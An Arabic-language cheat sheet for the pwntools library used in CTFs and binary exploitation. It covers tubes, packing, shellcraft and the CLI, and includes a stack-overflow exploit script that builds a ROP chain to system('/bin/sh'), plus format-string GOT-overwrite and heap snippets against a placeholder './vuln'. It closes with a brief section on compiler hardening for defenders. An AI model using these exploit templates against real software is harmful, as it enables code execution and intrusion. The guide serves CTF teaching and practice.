# pwntools — الدليل الشامل للتطوير والاستغلال البرمجي

تُعد مكتبة `pwntools` المعيار الفعلي (de-facto) في مجتمع CTF وتطوير الثغرات (Exploit Development) باستخدام Python. توفر المكتبة إطار عمل متكامل يغطي كافة مراحل استغلال الثغرات الثنائية (Binary Exploitation): من الاتصال بالخوادم البعيدة، وإرسال واستقبال البيانات مع التغليف (Packing)، بناء سلاسل ROP، توليد الـ Shellcode، حساب إزاحات (Offsets) سلاسل التنسيق (Format Strings)، وصولاً إلى الربط مع gdb وتحليل ملفات ELF.

## التثبيت (Install)

```terminal
pip install pwntools
# أدوات إضافية موصى بها بشدة:
pip install ropper        # للبحث عن ROP gadgets
sudo apt install gdb gdb-multiarch ltrace strace
```

## الأساسيات والاستيراد (Imports / basics)

```python
from pwn import *

# ضبط سياق العمل: المعمارية، نظام التشغيل، ومستوى السجلات
context.update(arch='amd64', os='linux', log_level='info')

# الاتصال بخادم بعيد (Remote)
io = remote('chal.example.com', 1337)

# التشغيل محلياً (Local)
io = process('./vuln')

# الربط مع gdb (يفضل استخدامه داخل tmux)
io = process('./vuln'); gdb.attach(io, '''
b *main+50
c
''')

# التفاعل مع الدخل/الخرج (send / recv)
io.sendline(b'AAAA')
data = io.recv(1024)
data = io.recvline()
data = io.recvuntil(b'>')
io.sendlineafter(b'>', payload)
io.interactive()              # الانتقال للوضع اليدوي التفاعلي
```

## الدوال المساعدة الشائعة (Common helpers)

| الأداة المساعدة | الغرض |
|--------|---------|
| `cyclic(N)` | توليد نمط de Bruijn (لتحديد الإزاحة/Offset) |
| `cyclic_find(b'caaa')` | تحويل النمط المكتشف إلى رقم إزاحة صحيح |
| `p64(x)` / `p32(x)` | تغليف القيمة (Pack) بنظام Little-endian |
| `u64(b'\x00...')` / `u32(...)` | فك التغليف (Unpack) |
| `flat(...)` | تغليف قيم متعددة مع إضافة حشوة (Padding) |
| `asm('mov rax, 1; ret')` | التجميع (Assemble) |
| `disasm(b'\x48\x31\xc0')` | فك التجميع (Disassemble) |
| `shellcraft.amd64.linux.sh()` | توليد Shellcode جاهز |
| `ELF('./vuln')` | تحليل ملف ELF (استخراج `symbols`, `got`, `plt`) |
| `ROP(elf)` | بناء سلسلة ROP chain تلقائياً |
| `process.libs()` | كشف المكتبات المحملة وعناوينها القاعدية |
| `log.info('...')` / `log.success('...')` | مخرجات منظمة وجمالية |

## مثال عملي — استغلال تجاوز سعة المكدس (Stack Overflow)

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
e = ELF('./vuln')
io = process('./vuln')

# 1. تحديد الإزاحة إلى مسجل RIP عبر نمط cyclic
# io.sendline(cyclic(200)); core = io.corefile  # ثم cyclic_find(core.fault_addr)
offset = 72

# 2. بناء ROP: البحث عن الأدوات (Gadgets) عبر ROPper أو pwntools
rop = ROP(e)
rop.raw(rop.find_gadget(['ret']))     # محاذاة المكدس (Stack alignment)
rop.system(next(e.search(b'/bin/sh')))

payload = b'A' * offset + rop.chain()

io.sendline(payload)
io.interactive()
```

## سلاسل التنسيق (Format string)

```python
# حساب المؤشر وتسريب الـ Canary
io.sendline(f"%{idx}$lx".encode())
canary = int(io.recvline().strip(), 16)

# الكتابة في عنوان عشوائي باستخدام %n
fmt = fmtstr_payload(offset=6, writes={got['exit']: shellcode_addr})
io.sendline(fmt)
```

تقوم دالة `fmtstr_payload` بالعمليات المعقدة (حساب الإزاحات، طول البادئة، والترتيب).

## التعامل مع الـ Heap

```python
def malloc(size, data=b''):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size?', str(size).encode())
    io.sendafter(b'data?', data)

def free(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'idx?', str(idx).encode())
```

يُنصح بتغليف البروتوكول أولاً، ثم تنفيذ الهجوم بشكل تجريدي.

## أوامر واجهة السطر (pwn cli)

```terminal
pwn checksec ./vuln                  # فحص تقنيات الحماية (NX/PIE/Canary)
pwn cyclic 200                       # توليد نمط de Bruijn
pwn cyclic --lookup 0x6161616c       # البحث عن الإزاحة
pwn shellcraft -f d amd64.linux.sh    # عرض الـ assembly للـ shellcode
pwn shellcraft -f e amd64.linux.sh    # توليد ملف elf يحتوي على الـ shellcode
pwn debug ./vuln                     # تشغيل البرنامج مع gdb مباشرة
pwn template ./vuln                  # توليد هيكل نصي للاستغلال (Exploit Boilerplate)
pwn unhex 'hexstring'                # تحويل hex إلى string
```

## القنوات والاتصال (Tubes / I/O)

```python
io = remote('host', 1337)
io = ssh('user', 'host', password='pwn').process('./vuln')
io = listen(1337)         # التنصت على منفذ (لعمليات الـ Callbacks)
io = serial('/dev/ttyUSB0') # الاتصال عبر المنفذ التسلسلي

# أنماط الاستقبال
io.recv(timeout=2)
io.recvline_contains(b'flag')
io.recvuntil(b'>')
io.send(b'...')
io.close()
```

## تشخيص الأخطاء الشائعة (Troubleshooting)

| العرض | الحل |
|---------|-----|
| `EOFError` بعد الإرسال | البرنامج توقف بشكل مفاجئ (Crash)؛ هذا جيد، ابحث عن السبب في stderr أو coredump |
| تعليق دالة `recv` | الفاصل (Delimiter) خاطئ؛ استخدم `recvuntil` مع المؤشر (Prompt) الصحيح |
| `cyclic_find` تعيد -1 | طول النمط غير كافٍ؛ قم بزيادة طول نمط cyclic |
| سلسلة ROP تعود لعناوين عشوائية | مشكلة محاذاة (ret-aligned)؛ أضف أداة `ret` واحدة لمحاذاة المكدس |
| اختلاف libc في الخادم البعيد | استخدم `libc-database` لتحميل نسخة متوافقة؛ استخدم `patchelf` للتحميل محلياً |

## منظور المدافع (Defender perspective)

لا تُستخدم `pwntools` في الجوانب الدفاعية مباشرة، ولكن فهم الأدوات التي يستخدمها المهاجمون يساعد في تحصين الأنظمة:

- تفعيل تقنيات مثل **NX**, **stack canaries**, **ASLR/PIE**, **Full RELRO**, و **Control Flow Integrity (CFI)** يزيد من تكلفة وصعوبة الاستغلال باستخدام pwntools.
- يجب تفعيل خيارات المترجم (Compiler flags) مثل `-D_FORTIFY_SOURCE=2` و `-fstack-protector-strong` و `-Wl,-z,now` كمعايير أساسية.

## أدوات ذات صلة

| الأداة | التخصص |
|------|-------|
| **ropper** | البحث عن أدوات ROP/JOP |
| **angr** | التنفيذ الرمزي (Symbolic execution) والأتمتة |
| **GDB + GEF / pwndbg** | إضافات لتحسين بيئة gdb للمهاجمين |
| **libc-database** | تحديد إصدارات libc من العناوين المسربة |
| **one_gadget** | إيجاد "الأدوات السحرية" (one-gadget RCE) داخل libc |
| **patchelf** | تعديل الـ RPATH والـ Interpreter لاختبار توافق المكتبات |
